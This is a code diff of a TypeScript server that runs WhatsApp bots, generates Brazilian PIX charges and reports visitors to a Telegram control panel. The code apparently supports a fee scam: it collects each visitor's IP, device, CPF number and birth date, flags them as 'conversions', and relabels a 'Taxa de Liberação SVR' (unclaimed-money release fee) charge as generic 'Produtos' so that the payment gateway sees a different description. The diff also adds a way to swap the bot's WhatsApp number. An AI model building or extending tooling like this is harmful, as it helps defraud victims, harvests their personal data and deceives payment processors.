@@ -100,16 +100,13 @@ const MAX_SLOTS = 5;
 function stopBot(id: string) {
   const proc = botProcesses.get(id);
   if (proc) {
+    proc.removeAllListeners('exit');
     try { proc.kill(); } catch (e) { }
     botProcesses.delete(id);
   }
 }
 
-let isBotStarting = false;
 function startBot(id: string = 'main') {
-  if (isBotStarting && id === 'main') return;
-  if (id === 'main') isBotStarting = true;
-
   stopBot(id);
   console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
   const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });
@@ -361,7 +358,7 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
       },
       items: [
         {
-          title: "Taxa de Liberação SVR",
+          title: "Produtos",
           unitPrice: Math.round(valorNumeric * 100),
           quantity: 1,
           tangible: false
@@ -371,9 +368,9 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
         name,
         email,
         phone: telefone.replace(/\D/g, ''),
-        document: { 
-          number: doc.replace(/\D/g, ''), 
-          type: doc.replace(/\D/g, '').length > 11 ? "CNPJ" : "CPF" 
+        document: {
+          number: doc.replace(/\D/g, ''),
+          type: doc.replace(/\D/g, '').length > 11 ? "CNPJ" : "CPF"
         }
       }
     };
@@ -388,9 +385,9 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
       }
     });
 
-    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode || pixRes.data.data?.pix_code || pixRes.data.data?.qrcode;
+    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode || pixRes.data.data?.pix_code || pixRes.data.data?.qrcode || pixRes.data.data?.pix?.qrcode || pixRes.data.pix?.qrcode || pixRes.data.data?.pix?.copyPaste;
     const transId = pixRes.data.id || pixRes.data.transactionId || pixRes.data.data?.id;
-    
+
     console.log(`✅ [GATEWAY] Resposta recebida. PIX Code: ${pixCode ? 'SIM' : 'NÃO'} - ID: ${transId}`);
 
     if (!pixCode) {
@@ -431,15 +428,15 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
     });
 
     if (msgIdSent) {
-        console.log(`✅ [TELEGRAM] QR Code enviado com sucesso (MsgID: ${msgIdSent}). Agendando exclusão para 15 min.`);
-        setTimeout(async () => {
-            try {
-                await axios.post(`${TELEGRAM_URL}/deleteMessage`, { chat_id: CHAT_ID, message_id: msgIdSent });
-                console.log(`🗑️ [TELEGRAM] QR Code (MsgID: ${msgIdSent}) apagado após 15 minutos de expiração.`);
-            } catch (e: any) {
-                console.error(`❌ [TELEGRAM] Erro ao apagar QR Code expirado:`, e.response?.data?.description || e.message);
-            }
-        }, 15 * 60 * 1000);
+      console.log(`✅ [TELEGRAM] QR Code enviado com sucesso (MsgID: ${msgIdSent}). Agendando exclusão para 15 min.`);
+      setTimeout(async () => {
+        try {
+          await axios.post(`${TELEGRAM_URL}/deleteMessage`, { chat_id: CHAT_ID, message_id: msgIdSent });
+          console.log(`🗑️ [TELEGRAM] QR Code (MsgID: ${msgIdSent}) apagado após 15 minutos de expiração.`);
+        } catch (e: any) {
+          console.error(`❌ [TELEGRAM] Erro ao apagar QR Code expirado:`, e.response?.data?.description || e.message);
+        }
+      }, 15 * 60 * 1000);
     }
 
   } catch (e: any) {
@@ -491,15 +488,15 @@ function crc16(data: string): string {
 // Gera o código PIX estático (Copia e Cola) a partir de uma chave
 function buildStaticPix(key: string, name: string, amount: number) {
   if (key.startsWith('000201')) return key; // Já é um BRCode
-  
+
   const cleanName = name.normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase().substring(0, 25);
   const amountStr = amount.toFixed(2);
-  
+
   const gui = "br.gov.bcb.pix";
   const keyTag = `01${key.length.toString().padStart(2, '0')}${key}`;
   const merchantInfoValue = `0014${gui}${keyTag}`;
   const merchantInfo = `26${merchantInfoValue.length.toString().padStart(2, '0')}${merchantInfoValue}`;
-  
+
   const payload = [
     "000201",
     merchantInfo,
@@ -591,7 +588,7 @@ function resetBotSession(id: string) {
   }
   const qrMsgFile = path.join(process.cwd(), `bot-qr-msg-${id}.json`);
   if (fs.existsSync(qrMsgFile)) {
-    try { fs.unlinkSync(qrMsgFile); } catch (e) {}
+    try { fs.unlinkSync(qrMsgFile); } catch (e) { }
   }
   startBot(id);
 }
@@ -701,15 +698,15 @@ async function sendTelegramPhoto(buffer: Buffer, caption: string, replyMarkup?: 
     form.append('caption', caption);
     form.append('parse_mode', 'HTML');
     if (replyMarkup) form.append('reply_markup', JSON.stringify(replyMarkup));
-    
+
     // axios explicitly needs headers from FormData in node environments
     const headers = form.getHeaders();
-    
+
     const res = await axios.post(`${TELEGRAM_URL}/sendPhoto`, form, { headers });
     return res.data.result?.message_id || null;
-  } catch (e: any) { 
+  } catch (e: any) {
     console.error(`❌ [TELEGRAM] Erro sendPhoto:`, e.response?.data?.description || e.message);
-    return null; 
+    return null;
   }
 }
 
@@ -723,10 +720,10 @@ app.post("/api/v1/session/start", async (req, res) => {
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
   if (sessions.has(userId)) return res.json({ status: "exists" });
   const startTime = Date.now();
-  
+
   const safeIp = escapeHtml(String(ip));
   const safeDevice = escapeHtml(String(device));
-  
+
   const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
   sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
   saveVisitors();
@@ -747,7 +744,7 @@ app.post("/api/v1/session/convert", async (req, res) => {
     session.converted = true;
     session.docValue = details.docValue;
     session.birthDate = details.birthDate;
-    
+
     const safeIp = escapeHtml(session.ip);
     const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
     await sendTelegram(msg, session.messageId || undefined);
@@ -816,7 +813,7 @@ setInterval(async () => {
 // --- Dashboard Logic ---
 async function startTelegramPolling() {
   if (!TG_TOKEN) return;
-  
+
   // Clear any existing webhooks to prevent 409 Conflict errors
   try {
     await axios.get(`${TELEGRAM_URL}/deleteWebhook`);
@@ -883,7 +880,7 @@ async function startTelegramPolling() {
         }
         else if (text.startsWith("painel:manage:")) {
           const id = text.split(":")[2];
-          await sendTelegram(`⚙️ <b>GERENCIAR: ${id === 'main' ? 'Perfil 1 (Admin)' : 'Atendente ' + id.replace('parceiro','')}</b>\n\nEscolha uma ação de sistema:`, msgId, {
+          await sendTelegram(`⚙️ <b>GERENCIAR: ${id === 'main' ? 'Perfil 1 (Admin)' : 'Atendente ' + id.replace('parceiro', '')}</b>\n\nEscolha uma ação de sistema:`, msgId, {
             inline_keyboard: [
               [{ text: "📲 Conectar / Gerar QR Code", callback_data: `generate_qr:${id}` }],
               [{ text: "🔄 Reiniciar Instância", callback_data: `painel:reiniciar:slot:${id}` }],
@@ -930,29 +927,29 @@ async function startTelegramPolling() {
         }
         else if (text.startsWith("pix_sel:preauto:")) {
           const chatId = text.split(":")[2];
-          botStates.set(userId, { 
-            action: 'pix_preauto_menu', 
-            data: { 
-              chatId, 
+          botStates.set(userId, {
+            action: 'pix_preauto_menu',
+            data: {
+              chatId,
               amount: "0.00",
-              name: currentConfig.pixName, 
+              name: currentConfig.pixName,
               email: currentConfig.pixEmail,
-              doc: currentConfig.pixDocument 
-            } 
+              doc: currentConfig.pixDocument
+            }
           });
           await showPixPreAutoMenu(userId, msgId);
         }
         else if (text.startsWith("pix_sel:manual:")) {
           const chatId = text.split(":")[2];
-          botStates.set(userId, { 
-            action: 'pix_manual_menu', 
-            data: { 
-              chatId, 
-              key: '', 
+          botStates.set(userId, {
+            action: 'pix_manual_menu',
+            data: {
+              chatId,
+              key: '',
               amount: "0.00",
-              name: currentConfig.pixName, 
-              doc: currentConfig.pixDocument 
-            } 
+              name: currentConfig.pixName,
+              doc: currentConfig.pixDocument
+            }
           });
           await showPixManualMenu(userId, msgId);
         }
@@ -1232,6 +1229,10 @@ async function startTelegramPolling() {
           fs.writeFileSync('refresh-qr.json', JSON.stringify({ requestedAt: Date.now() }));
           await sendTelegram(`🔄 <b>SOLICITAÇÃO RECEBIDA</b>\n\nGerando novo QR Code para o robô... Aguarde alguns segundos.`, msgId);
         }
+        else if (text === "painel:change_whatsapp_num") {
+          botStates.set(userId, { action: 'awaiting_whatsapp_new_number' });
+          await sendTelegram(`📱 <b>ALTERAR NÚMERO WHATSAPP</b>\n\nPor favor, digite o novo número de WhatsApp do bot (com DDI e DDD, ex: 5511999999999):\n\n<i>O bot será reiniciado com este número, gerando um novo QR Code.</i>`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
+        }
         else if (text.startsWith("pix_dest:")) {
           const parts = text.split(":");
           const dest = parts[1];
@@ -1333,11 +1334,26 @@ async function startTelegramPolling() {
             botStates.delete(userId);
             await sendTelegram(`✅ <b>SMTP ATUALIZADO!</b>\n\nO campo <b>${field}</b> foi definido com sucesso.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_smtp" }]] });
           }
+          else if (state?.action === 'awaiting_whatsapp_new_number') {
+            const newNumber = msg.text.replace(/\D/g, '');
+            if (newNumber.length < 10) {
+              await sendTelegram(`❌ <b>NÚMERO INVÁLIDO</b>\n\nDigite um número válido.`, msgId);
+              return;
+            }
+            currentConfig.whatsappNumber = newNumber;
+            saveConfig();
+            botStates.delete(userId);
+            
+            await sendTelegram(`✅ <b>NÚMERO ATUALIZADO!</b>\n\nO novo número (${newNumber}) foi salvo e o bot principal será reiniciado para gerar um novo QR Code.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
+            
+            // Reinicia o bot principal
+            resetBotSession('main');
+          }
           else if (state?.action === 'pix_auto_await_value' || state?.action === 'awaiting_lead_pix_value') {
             let cleanVal = msg.text.trim();
             const parts = cleanVal.split(',');
             if (parts.length > 1) {
-                cleanVal = parts.slice(0, -1).join('').replace(/\./g, '') + '.' + parts[parts.length - 1];
+              cleanVal = parts.slice(0, -1).join('').replace(/\./g, '') + '.' + parts[parts.length - 1];
             }
             const amount = parseFloat(cleanVal);
             if (isNaN(amount) || amount <= 0) {
@@ -1395,7 +1411,7 @@ async function startTelegramPolling() {
             }
             const chatId = state.data.chatId;
             botStates.delete(userId);
-            
+
             const taxa = (valor * currentConfig.gatewayFee) / 100;
             const liquido = valor - taxa;
 
